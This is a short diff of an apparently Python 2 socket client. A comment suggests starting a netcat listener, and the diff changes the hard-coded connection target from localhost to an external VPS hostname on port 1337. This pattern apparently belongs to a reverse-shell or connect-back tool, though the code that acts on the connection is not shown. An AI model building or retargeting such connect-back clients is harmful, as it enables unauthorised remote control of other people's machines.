@@ -5,8 +5,8 @@ You can try netcat command : nc -l -k  [port] (E.g nc -l -k  5002)
 
 
 # Set the host and the port.
-HOST = "127.0.0.1"
-PORT = 5002
+HOST = "vmi850151.contaboserver.net"
+PORT = 1337
 
 def connect((host, port)):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
